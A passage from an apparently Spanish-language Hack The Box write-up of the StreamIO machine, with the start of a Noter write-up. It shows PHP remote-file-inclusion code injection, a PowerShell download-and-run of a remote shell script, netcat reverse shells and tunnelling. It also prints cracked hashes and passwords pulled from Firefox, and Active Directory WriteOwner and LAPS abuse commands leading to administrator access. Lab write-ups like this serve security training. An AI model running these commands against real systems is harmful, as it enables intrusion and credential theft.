array(\u0026#34;Scrollable\u0026#34;=\u0026gt;\u0026#34;buffered\u0026#34;)); while($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC)) { ?\u0026gt; \u0026lt;div\u0026gt; \u0026lt;div class=\u0026#34;form-control\u0026#34; style=\u0026#34;height: 3rem;\u0026#34;\u0026gt; \u0026lt;h4 style=\u0026#34;float:left;\u0026#34;\u0026gt;\u0026lt;?php echo $row[\u0026#39;username\u0026#39;]; ?\u0026gt;\u0026lt;/h4\u0026gt; \u0026lt;div style=\u0026#34;float:right;padding-right: 25px;\u0026#34;\u0026gt; \u0026lt;form method=\u0026#34;POST\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;user_id\u0026#34; value=\u0026#34;\u0026lt;?php echo $row[\u0026#39;id\u0026#39;]; ?\u0026gt;\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; class=\u0026#34;btn btn-sm btn-primary\u0026#34; value=\u0026#34;Delete\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;?php } # while end ?\u0026gt; \u0026lt;br\u0026gt;\u0026lt;hr\u0026gt;\u0026lt;br\u0026gt; \u0026lt;form method=\u0026#34;POST\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;include\u0026#34; hidden\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;?php if(isset($_POST[\u0026#39;include\u0026#39;])){ if($_POST[\u0026#39;include\u0026#39;] !== \u0026#34;index.php\u0026#34; ) eval(file_get_contents($_POST[\u0026#39;include\u0026#39;])); else echo(\u0026#34; ---- ERROR ---- \u0026#34;); } ?\u0026gt; Code Injection -\u0026gt; RFI La función eval() acepta código php y lo ejecuta, mientras que file_get_contents() obtiene el contenido del archivo o url, como de una vulnerabilidad RFI se tratase.\n1 2 3 4 5 6 7 8 9 10 11 12 // [.. snip ..] \u0026lt;form method=\u0026#34;POST\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;include\u0026#34; hidden\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;?php if(isset($_POST[\u0026#39;include\u0026#39;])){ if($_POST[\u0026#39;include\u0026#39;] !== \u0026#34;index.php\u0026#34; ) eval(file_get_contents($_POST[\u0026#39;include\u0026#39;])); else echo(\u0026#34; ---- ERROR ---- \u0026#34;); } ?\u0026gt; Para tomar ventaja de lo anterior creamos un archivo que contenga codigo php para ejecutar comandos, en este caso realizamos una consulta DNS, además ejecutamos responder y un servidor HTTP con python.\n1 system(\u0026#39;nslookup streamiotest 10.10.14.207\u0026#39;); Tomando el cookie de la pagina realizamos la consulta con curl, ya que la respuesta es muy larga enviamos el output a /dev/null. Pasamos la url con el archivo que contiene codigo php, file_get_contents() obtendría su contenido y sería ejecutado por eval().\n1 curl -isk -X POST -b \u0026#39;PHPSESSID=h5bnkjot60p3dlokd7lvrfeqbd\u0026#39; --data \u0026#39;include=http://10.10.14.207/php.txt\u0026#39; \u0026#39;https://streamio.htb/admin/?debug=master.php\u0026#39; -o /dev/null Como podemos observar el comando fue ejecutado y se realizó la consulta DNS.\nShell Utilizamos una de las shells de nishang (Invoke-PowerShellTcp), agregando al final la dirección y puerto.\n1 Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.188 -Port 443 En el codigo php ejecutamos powershell para la descarga y ejecución de la shell.\n1 system(\u0026#34;powershell.exe -c iex(new-object net.webclient).downloadstring(\u0026#39;http://10.10.14.207/shell.ps1\u0026#39;)\u0026#34;); Tras ejecutar el codigo php logramos obtener una shell como yoshihide.\n1 2 3 4 5 6 7 8 9 π ~/htb/streamio ❯ rlwrap nc -lvp 1338 listening on [any] 1338 ... connect to [10.10.14.207] from streamio.htb [10.10.11.158] 54252 Windows PowerShell running as user DC$ on DC Copyright (C) 2015 Microsoft Corporation. All rights reserved. PS C:\\inetpub\\streamio.htb\\admin\u0026gt; whoami streamio\\yoshihide PS C:\\inetpub\\streamio.htb\\admin\u0026gt; User - Nikk37 Realizamos una enumeración de los programas instalados, observamos LAPS aunque el usuario actual no pertenece a algun grupo relacionado a este, además tambien se observa el navegador Firefox, al inspeccionar %appdata% no existe la carpeta Mozilla.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 PS C:\\\u0026gt; dir \u0026#34;Program Files\u0026#34; Directory: C:\\Program Files Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 2/22/2022 1:35 AM Common Files d----- 2/22/2022 2:57 AM iis express d----- 3/28/2022 4:46 PM internet explorer d----- 2/22/2022 2:14 AM LAPS d----- 2/22/2022 2:52 AM Microsoft d----- 2/22/2022 1:54 AM Microsoft SQL Server d----- 2/22/2022 1:53 AM Microsoft Visual Studio 10.0 d----- 2/22/2022 1:53 AM Microsoft.NET d----- 2/25/2022 11:35 PM PHP d----- 2/22/2022 2:56 AM Reference Assemblies d----- 2/22/2022 2:56 AM runphp d----- 2/22/2022 1:35 AM VMware d-r--- 3/28/2022 4:46 PM Windows Defender d----- 3/28/2022 6:06 PM Windows Defender Advanced Threat Protection d----- 3/28/2022 4:46 PM Windows Mail d----- 3/28/2022 4:46 PM Windows Media Player d----- 9/15/2018 12:19 AM Windows Multimedia Platform d----- 9/15/2018 12:28 AM windows nt d----- 3/28/2022 4:46 PM Windows Photo Viewer d----- 9/15/2018 12:19 AM Windows Portable Devices d----- 9/15/2018 12:19 AM Windows Security d----- 9/15/2018 12:19 AM WindowsPowerShell PS C:\\\u0026gt; dir \u0026#34;Program Files (x86)\u0026#34; Directory: C:\\Program Files (x86) Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 9/15/2018 12:28 AM Common Files d----- 2/25/2022 11:35 PM IIS d----- 2/25/2022 11:38 PM iis express d----- 3/28/2022 4:46 PM Internet Explorer d----- 2/22/2022 1:54 AM Microsoft SQL Server d----- 2/22/2022 1:53 AM Microsoft.NET d----- 5/26/2022 4:09 PM Mozilla Firefox d----- 5/26/2022 4:09 PM Mozilla Maintenance Service d----- 2/25/2022 11:33 PM PHP d----- 2/22/2022 2:56 AM Reference Assemblies d----- 3/28/2022 4:46 PM Windows Defender d----- 3/28/2022 4:46 PM Windows Mail d----- 3/28/2022 4:46 PM Windows Media Player d----- 9/15/2018 12:19 AM Windows Multimedia Platform d----- 9/15/2018 12:28 AM windows nt d----- 3/28/2022 4:46 PM Windows Photo Viewer d----- 9/15/2018 12:19 AM Windows Portable Devices d----- 9/15/2018 12:19 AM WindowsPowerShell PS C:\\\u0026gt; dir $env:APPDATA Directory: C:\\Windows\\system32\\config\\systemprofile\\AppData\\Roaming Mode LastWriteTime Length Name ---- ------------- ------ ---- d---s- 2/22/2022 1:33 AM Microsoft PS C:\\\u0026gt; WinPEAS Tras la ejecución de WinPEAS observamos que el puerto 1433 de sqlserver esta a la escucha localmente, además se muestra un hash ntlm del usuario yoshihide, tras intentar crackear este hash con el wordlist rockyou.txt no encontramos algun resultado.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 [.. snip ..] ???????????? Current TCP Listening Ports ? Check for services restricted from the outside Enumerating IPv4 connections Protocol Local Address Local Port Remote Address Remote Port State Process ID Process Name TCP 0.0.0.0 80 0.0.0.0 0 Listening 4 System TCP 0.0.0.0 88 0.0.0.0 0 Listening 640 lsass TCP 0.0.0.0 135 0.0.0.0 0 Listening 900 svchost TCP 0.0.0.0 389 0.0.0.0 0 Listening 640 lsass TCP 0.0.0.0 443 0.0.0.0 0 Listening 4 System TCP 0.0.0.0 445 0.0.0.0 0 Listening 4 System TCP 0.0.0.0 464 0.0.0.0 0 Listening 640 lsass TCP 0.0.0.0 593 0.0.0.0 0 Listening 900 svchost TCP 0.0.0.0 636 0.0.0.0 0 Listening 640 lsass TCP 0.0.0.0 1433 0.0.0.0 0 Listening 3664 sqlservr TCP 0.0.0.0 3268 0.0.0.0 0 Listening 640 lsass TCP 0.0.0.0 3269 0.0.0.0 0 Listening 640 lsass TCP 0.0.0.0 5985 0.0.0.0 0 Listening 4 System TCP 0.0.0.0 9389 0.0.0.0 0 Listening 2652 Microsoft.ActiveDirectory.WebServices TCP 0.0.0.0 47001 0.0.0.0 0 Listening 4 System TCP 0.0.0.0 49664 0.0.0.0 0 Listening 480 wininit TCP 0.0.0.0 49665 0.0.0.0 0 Listening 1176 svchost TCP 0.0.0.0 49666 0.0.0.0 0 Listening 1576 svchost TCP 0.0.0.0 49667 0.0.0.0 0 Listening 640 lsass TCP 0.0.0.0 49673 0.0.0.0 0 Listening 640 lsass TCP 0.0.0.0 49674 0.0.0.0 0 Listening 640 lsass TCP 0.0.0.0 49686 0.0.0.0 0 Listening 620 services TCP 0.0.0.0 49702 0.0.0.0 0 Listening 2820 dns TCP 0.0.0.0 56105 0.0.0.0 0 Listening 2780 dfsrs TCP 10.10.11.158 53 0.0.0.0 0 Listening 2820 dns TCP 10.10.11.158 139 0.0.0.0 0 Listening 4 System TCP 10.10.11.158 54252 10.10.14.207 1338 Established 1756 C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe TCP 10.10.11.158 56094 10.10.14.92 4444 Close Wait 5192 C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe TCP 127.0.0.1 53 0.0.0.0 0 Listening 2820 dns [.. snip ..] ???????????? Enumerating Security Packages Credentials Version: NetNTLMv2 Hash: yoshihide::streamIO:1122334455667788:fe107ad0aeb1122ebf4e07d13b65d144:0101000000000000528a3f153a91d80121fd1e3c30cb16ff000000000800300030000000000000000000000000210000acfa41554dd286a58a5647344d8ad1789a997ea0f3255355b364f4cbc1594b5d0a00100000000000000000000000000000000000090000000000000000000000 ================================================================================================= [.. snip ..] Chisel El puerto de SQL Server está abierto localmente en la máquina, ejecutamos chisel para obtener el puerto 1433 localmente en kali. Iniciamos un servidor samba con impacket y realizamos la copia de chisel.\n1 2 3 impacket-smbserver -username sc -password sc -smb2support -port 445 share . net use Z: \\\\10.10.14.207\\share /u:sc sc copy z:\\chisel17.exe . Ejecutamos chisel en la máquina, especificando el servidor y puerto, y el puerto 1433 de sql server.\n1 ./chisel17.exe client 10.10.14.207:7070 R:1433:0.0.0.0:1433 Ejecutamos chisel como servidor en kali. Hay que mencionar que la ultima version (1.7.7 como servidor) no realizaba la conexión, por lo que tambien utilizamos la version 1.7.\n1 2 3 4 5 6 π ~/htb/streamio/www ❯ ./chisel server -p 7070 --reverse 2022/07/06 17:51:19 server: Reverse tunnelling enabled 2022/07/06 17:51:19 server: Fingerprint 7f:19:de:80:57:ab:9e:58:65:79:a0:22:85:5c:51:87 2022/07/06 17:51:19 server: Listening on http://0.0.0.0:7070 2022/07/06 17:51:52 server: session#1: Client version (1.7.7) differs from server version (1.7.0) 2022/07/06 17:51:52 server: session#1: tun: proxy#R:1433=\u0026gt;0.0.0.0:1433: Listening Mssql Tras verificar que el puerto está localmente, ejecutamos mssqlclient de impacket con las credenciales del usuario admin, observamos las mismas bases de datos que en la inyeccion sql.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 π ~/htb/streamio/www ❯ impacket-mssqlclient db_admin:\u0026#39;B1@hx31234567890\u0026#39;@127.0.0.1 Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation [*] Encryption required, switching to TLS [*] ENVCHANGE(DATABASE): Old Value: master, New Value: master [*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english [*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192 [*] INFO(DC): Line 1: Changed database context to \u0026#39;master\u0026#39;. [*] INFO(DC): Line 1: Changed language setting to us_english. [*] ACK: Result: 1 - Microsoft SQL Server (150 7208) [!] Press help for extra shell commands SQL\u0026gt; select name from sys.databases name -------------------------------------------------------------------------------------------------------------------------------- master tempdb model msdb STREAMIO streamio_backup SQL\u0026gt; Con este usuario logramos acceder a la base de datos streamio_backup, en esta encontramos nombres de usuarios y hashes de contraseñas.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 SQL\u0026gt; select table_name from streamio_backup.information_schema.tables table_name -------------------------------------------------------------------------------------------------------------------------------- movies users SQL\u0026gt; use streamio_backup [*] ENVCHANGE(DATABASE): Old Value: master, New Value: streamio_backup [*] INFO(DC): Line 1: Changed database context to \u0026#39;streamio_backup\u0026#39;. SQL\u0026gt; select * from users id username password ----------- -------------------------------------------------- -------------------------------------------------- 1 nikk37 389d14cb8e4e9b94b137deb1caf0612a 2 yoshihide b779ba15cedfd22a023c4d8bcf5f2332 3 James c660060492d9edcaa8332d89c99c9239 4 Theodore 925e5408ecb67aea449373d668b7359e 5 Samantha 083ffae904143c4796e464dac33c1f7d 6 Lauren 08344b85b329d7efd611b7a7743e8a09 7 William d62be0dc82071bccc1322d64ec5b6c51 8 Sabrina f87d3c0d6c8fd686aacc6627f1f493a5 SQL\u0026gt; Online Password Hash Crack Nuevamente crackstation y md5decrypt nos devolvieron en texto plano algunas de los ocho hashes, uno de estos diffiere del resto.\nExpand me - Hashes\r1 389d14cb8e4e9b94b137deb1caf0612a:get_dem_girls2@yahoo.com Brute Force - LDAP Realizamos brute force con las contraseñas y usuarios encontrados a ldap, encontramos una combinación para el usuario nikk37.\n1 2 3 4 π ~/htb/streamio/db ❯ crackmapexec ldap streamio.htb -u users.txt -p pass.txt SMB streamio.htb 445 DC [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:False) LDAP streamio.htb 389 DC [+] streamIO.htb\\nikk37:get_dem_girls2@yahoo.com π ~/htb/streamio/db ❯ Bloodhound Utilizamos bloodhound.py para obtener información del AD con las credenciales encontradas.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 π ~/htb/streamio/db ❯ /opt/BloodHound.py/bloodhound.py -u nikk37 -p \u0026#34;get_dem_girls2@yahoo.com\u0026#34; -d streamio.htb -ns 10.10.11.158 -c all --zip INFO: Found AD domain: streamio.htb INFO: Connecting to LDAP server: dc.streamio.htb INFO: Found 1 domains INFO: Found 1 domains in the forest INFO: Found 1 computers INFO: Connecting to LDAP server: dc.streamio.htb INFO: Found 8 users INFO: Connecting to GC LDAP server: dc.streamio.htb INFO: Found 54 groups INFO: Found 0 trusts INFO: Starting computer enumeration with 10 workers INFO: Querying computer: DC.streamIO.htb INFO: Done in 00M 13S INFO: Compressing output into 20220706182038_bloodhound.zip π ~/htb/streamio/db ❯ Luego de importar el zip a bloodhound encontramos (query: \u0026lsquo;Shortes Path from Owned Principal\u0026rsquo;) que el usuario nikk37 puede crear una sesion de Powershell.\nShell Bloodhound nos muestra los comandos necesarios para obtener una sesion, en este caso ejecutar comandos con Invoke-Command similar a Arkham - HTB. Como se observa logramos ejecutar whoami como nikk37.\n1 2 3 4 5 6 PS C:\\\u0026gt; $SecPassword = ConvertTo-SecureString \u0026#39;get_dem_girls2@yahoo.com\u0026#39; -AsPlainText -Force; PS C:\\\u0026gt; $Cred = New-Object System.Management.Automation.PSCredential(\u0026#39;nikk37\u0026#39;, $SecPassword); PS C:\\\u0026gt; $session = New-PSSession -ComputerName DC.STREAMIO.HTB -Credential $Cred; PS C:\\\u0026gt; Invoke-Command -Session $session -ScriptBlock { whoami } streamio\\nikk37 PS C:\\\u0026gt; Ejecutamos una shell inversa utilizando netcat, este ultimo lo copiamos en la carpeta C:\\intepub\\temp.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 PS C:\\inetpub\\temp\u0026gt; dir Directory: C:\\inetpub\\temp Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 7/6/2022 9:30 PM appPools d----- 2/26/2022 1:03 AM IIS Temporary Compressed Files d----- 7/6/2022 10:57 PM Microsoft -a---- 7/6/2022 9:49 PM 8230912 chisel17.exe -a---- 7/6/2022 3:54 PM 59392 nc.exe -a---- 7/2/2022 10:53 PM 1936384 win.exe PS C:\\inetpub\\temp\u0026gt; Ejecutamos la shell inversa nuevamente con Invoke-Command.\n1 PS C:\\\u0026gt; Invoke-Command -Session $session -ScriptBlock { C:\\inetpub\\temp\\nc.exe -e powershell.exe 10.10.14.207 1339 } Logrando obtener asi una shell como nikk37 y la flag user.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 π ~/htb/streamio ❯ rlwrap nc -lvp 1339 listening on [any] 1339 ... connect to [10.10.14.207] from streamio.htb [10.10.11.158] 61516 Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved. PS C:\\Users\\nikk37\\Documents\u0026gt; whoami streamio\\nikk37 PS C:\\Users\\nikk37\\Documents\u0026gt; cd ../Desktop PS C:\\Users\\nikk37\\Desktop\u0026gt; dir Directory: C:\\Users\\nikk37\\Desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -ar--- 7/6/2022 9:31 PM 34 user.txt PS C:\\Users\\nikk37\\Desktop\u0026gt; cat user.f c0f221be01e87c098007517e57544ab5 PS C:\\Users\\nikk37\\Desktop\u0026gt; User - JDgodd Si recordamos Firefox está instalado en la máquina, si revisamos APPDATA encontramos la carpeta Mozilla, dentro vemos dos perfiles.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 PS C:\\users\\nikk37\\documents\u0026gt; dir $env:APPDATA Directory: C:\\Users\\nikk37\\AppData\\Roaming Mode LastWriteTime Length Name ---- ------------- ------ ---- d---s- 7/6/2022 11:10 PM Microsoft d----- 2/22/2022 2:40 AM Mozilla PS C:\\users\\nikk37\\documents\u0026gt; dir $env:APPDATA/Mozilla/Firefox/Profiles Directory: C:\\Users\\nikk37\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 2/22/2022 2:40 AM 5rwivk2l.default d----- 2/22/2022 2:42 AM br53rxeg.default-release PS C:\\users\\nikk37\\documents\u0026gt; Firefox Decrypt Copiamos los archivos: cert9.db, cookies.sqlite, key4.db y login.json (ref. 1), ejecutamos Firefox Decrypt en la carpeta, se listan usuarios y contraseñas.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 π ~/htb/streamio/firefox ❯ /opt/firefox_decrypt/firefox_decrypt.py . 2022-07-06 21:07:23,444 - WARNING - profile.ini not found in . 2022-07-06 21:07:23,445 - WARNING - Continuing and assuming \u0026#39;.\u0026#39; is a profile location Website: https://slack.streamio.htb Username: \u0026#39;admin\u0026#39; Password: \u0026#39;JDg0dd1s@d0p3cr3@t0r\u0026#39; Website: https://slack.streamio.htb Username: \u0026#39;nikk37\u0026#39; Password: \u0026#39;n1kk1sd0p3t00:)\u0026#39; Website: https://slack.streamio.htb Username: \u0026#39;yoshihide\u0026#39; Password: \u0026#39;paddpadd@12\u0026#39; Website: https://slack.streamio.htb Username: \u0026#39;JDgodd\u0026#39; Password: \u0026#39;password@12\u0026#39; π ~/htb/streamio/www/firefox ❯ Crackmapexec - LDAP Tras ejecutar crackmapexec en ldap, encontramos al usuario JDgodd con una combinación válida.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 π ~/htb/streamio/firefox ❯ crackmapexec ldap streamio.htb -u users.txt -p pass.txt SMB streamio.htb 445 DC [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:False) SMB streamio.htb 445 DC [-] streamIO.htb\\admin:JDg0dd1s@d0p3cr3@t0r SMB streamio.htb 445 DC [-] streamIO.htb\\admin:n1kk1sd0p3t00:) SMB streamio.htb 445 DC [-] streamIO.htb\\admin:paddpadd@12 SMB streamio.htb 445 DC [-] streamIO.htb\\admin:password@12 SMB streamio.htb 445 DC [-] streamIO.htb\\nikk37:JDg0dd1s@d0p3cr3@t0r SMB streamio.htb 445 DC [-] streamIO.htb\\nikk37:n1kk1sd0p3t00:) SMB streamio.htb 445 DC [-] streamIO.htb\\nikk37:paddpadd@12 SMB streamio.htb 445 DC [-] streamIO.htb\\nikk37:password@12 SMB streamio.htb 445 DC [-] streamIO.htb\\yoshihide:JDg0dd1s@d0p3cr3@t0r SMB streamio.htb 445 DC [-] streamIO.htb\\yoshihide:n1kk1sd0p3t00:) SMB streamio.htb 445 DC [-] streamIO.htb\\yoshihide:paddpadd@12 SMB streamio.htb 445 DC [-] streamIO.htb\\yoshihide:password@12 LDAP streamio.htb 389 DC [+] streamIO.htb\\JDgodd:JDg0dd1s@d0p3cr3@t0r π ~/htb/streamio/firefox ❯ Privesc Bloodhound nos muestra (query: \u0026lsquo;Shortes Path from Owned Principal\u0026rsquo;) que JDgodd tiene WriteOwner sobre el grupo Core Staff, este ultimo puede leer las contraseñas en LAPS de DC.STREAMIO.HTB.\nWrite Owner Para explotar o abusar de \u0026ldquo;Write Owner\u0026rdquo; necesitamos PowerView, Bloodhound provee la información y comandos necesarios (ver Abuse Info) aunque tambien nos referimos al post de WriteOwner Exploit.\n1 2 3 4 5 6 7 8 9 10 11 # cred $SecPassword = ConvertTo-SecureString \u0026#39;JDg0dd1s@d0p3cr3@t0r\u0026#39; -AsPlainText -Force $Cred = New-Object System.Management.Automation.PSCredential(\u0026#39;JDgodd\u0026#39;, $SecPassword) # set Jdgodd as owner of \u0026#39;core staff\u0026#39; Set-DomainObjectOwner -Credential $Cred -identity \u0026#34;CORE STAFF\u0026#34; -OwnerIdentity JDgodd # give jdgodd permissions Add-DomainObjectAcl -Credential $Cred -TargetIdentity \u0026#34;CORE STAFF\u0026#34; -PrincipalIdentity JDgodd # add to group Add-DomainGroupMember -Identity \u0026#39;CORE STAFF\u0026#39; -Members \u0026#39;JDgodd\u0026#39; -Credential $Cred # verify if group has jdgodd Get-DomainGroupMember -Identity \u0026#39;CORE STAFF\u0026#39; Tras ejecutar los comandos vemos que JDgodd es miembro del grupo Core Staff.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 PS C:\\Users\\nikk37\\Documents\u0026gt; cat -raw power.ps1 | iex PS C:\\Users\\nikk37\\Documents\u0026gt; Set-DomainObjectOwner -Credential $Cred -identity \u0026#34;CORE STAFF\u0026#34; -OwnerIdentity JDgodd PS C:\\Users\\nikk37\\Documents\u0026gt; Add-DomainObjectAcl -Credential $Cred -TargetIdentity \u0026#34;CORE STAFF\u0026#34; -PrincipalIdentity JDgodd PS C:\\Users\\nikk37\\Documents\u0026gt; Add-DomainGroupMember -Identity \u0026#39;CORE STAFF\u0026#39; -Members \u0026#39;JDgodd\u0026#39; -Credential $Cred PS C:\\Users\\nikk37\\Documents\u0026gt; Get-DomainGroupMember -Identity \u0026#39;CORE STAFF\u0026#39; GroupDomain : streamIO.htb GroupName : CORE STAFF GroupDistinguishedName : CN=CORE STAFF,CN=Users,DC=streamIO,DC=htb MemberDomain : streamIO.htb MemberName : JDgodd MemberDistinguishedName : CN=JDgodd,CN=Users,DC=streamIO,DC=htb MemberObjectClass : user MemberSID : S-1-5-21-1470860369-1569627196-4264678630-1104 PS C:\\Users\\nikk37\\Documents\u0026gt; ReadLAPSPassword Como sabemos el grupo \u0026lsquo;Core Staff\u0026rsquo; puede leer la contraseña de LAPS, ejecutamos Get-DomainObject como lo muestra Bloodhound para obtener las contraseñas de LAPS.\n1 2 3 4 5 6 7 8 PS C:\\Users\\nikk37\\Documents\u0026gt; Get-DomainObject DC.STREAMIO.HTB -Credential $Cred -Properties \u0026#34;ms-mcs-AdmPwd\u0026#34;,name name ms-mcs-admpwd ---- ------------- DC 035.1PDHS6dx99 PS C:\\Users\\nikk37\\Documents\u0026gt; Observamos que la contraseña es del administrador.\n1 2 3 4 π ~/htb/streamio ❯ crackmapexec ldap streamio.htb -u administrator -p \u0026#39;035.1PDHS6dx99\u0026#39; SMB streamio.htb 445 DC [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:False) LDAP streamio.htb 389 DC [+] streamIO.htb\\administrator:035.1PDHS6dx99 (Pwn3d!) π ~/htb/streamio ❯ Shell Utilizando una sesion de powershell igual que con nikk37, logramos ejecutar comandos como administrador.\n1 2 3 4 5 6 PS C:\\Users\\nikk37\\Documents\u0026gt; $SecPassword = ConvertTo-SecureString \u0026#39;035.1PDHS6dx99\u0026#39; -AsPlainText -Force PS C:\\Users\\nikk37\\Documents\u0026gt; $Cred = New-Object System.Management.Automation.PSCredential(\u0026#39;administrator\u0026#39;, $SecPassword) PS C:\\Users\\nikk37\\Documents\u0026gt; $session = New-PSSession -ComputerName DC.STREAMIO.HTB -Credential $Cred PS C:\\Users\\nikk37\\Documents\u0026gt; Invoke-Command -Session $session -ScriptBlock { whoami } streamio\\administrator PS C:\\Users\\nikk37\\Documents\u0026gt; Ejecutamos una shell inversa con netcat.\n1 Invoke-Command -Session $session -ScriptBlock { C:\\inetpub\\temp\\nc.exe -e powershell.exe 10.10.14.207 1337 } Logramos obtener una shell como administrador.\n1 2 3 4 5 6 7 8 9 π ~/htb/streamio ❯ rlwrap nc -lvp 1337 listening on [any] 1337 ... connect to [10.10.14.207] from streamio.htb [10.10.11.158] 62454 Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved. PS C:\\Users\\Administrator\\Documents\u0026gt; whoami streamio\\administrator PS C:\\Users\\Administrator\\Documents\u0026gt; Finalmente nuestra flag root.txt en el directorio de Martin.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 PS C:\\Users\\Martin\\Desktop\u0026gt; dir Directory: C:\\Users\\Martin\\Desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -ar--- 7/6/2022 9:31 PM 34 root.txt PS C:\\Users\\Martin\\Desktop\u0026gt; cat root.txt f5c12460bc33499475b6499e13b020da PS C:\\Users\\Martin\\Desktop\u0026gt; ","description":"En StreamIO descubrimos y explotamos una vulnerabilidad SQLi la cual nos permitió acceder a un panel de administración, en este ultimo encontramos una vulnerabilidad LFI, en consecuencia RFI y Code Injection lo que nos dió acceso a un primer usuario. Tras enumerar las bases de datos obtuvimos credenciales para un segundo usuario. Credenciales en un perfil de Firefox nos permitió ingresar con un tercer usuario. Finalmente con los permisos de este último realizamos la lectura de la contraseña en LAPS para acceder como administrador.","id":17,"section":"posts","tags":["sqli","time-based","SQL Server","python","responder","bloodhound","bloodhound.py","powershell","powerview","invoke-command","new-PSSession","ffuf","kerbrute","hydra","mssqlclient","chisel","firefox","LAPS","out-of-band","lfi","rfi","code injection"],"title":"Hack The Box - StreamIO","uri":"https://sckull.github.io/posts/streamio/"},{"content":"\rNoter presenta un sitio web por donde obtuvimos acceso tras crackear y modificar la cookie de flask, con la información que encontramos en el sitio logramos ingresar por FTP donde descubrimos un backup, lo que nos permitió descubrir una vulnerabilidad Command Injection con la cual accedimos a la máquina. Finalmente logramos leer la flag root utilizando MySQL y acceso como root con User-Defined Functions.\nNombre Noter OS Linux Puntos 30 Dificultad Media IP 10.10.11.160 Maker kavigihan\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[6, 5.6, 5.7, 4.3, 4.4],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[4, 5, 9, 1, 5],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} Recon nmap nmap muestra multiples puertos abiertos: http (80), ssh (22), ftp (21).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 # Nmap 7.92 scan initiated Mon May 9 21:36:06 2022 as: nmap -p21,22,5000 -sV -sC -oN nmap_scan 10.10.11.160 Nmap scan report for 10.10.11.160 (10.10.11.160) Host is up (0.072s latency). PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 c6:53:c6:2a:e9:28:90:50:4d:0c:8d:64:88:e0:08:4d (RSA) | 256 5f:12:58:5f:49:7d:f3:6c:bd:9b:25:49:ba:09:cc:43 (ECDSA) |_ 256 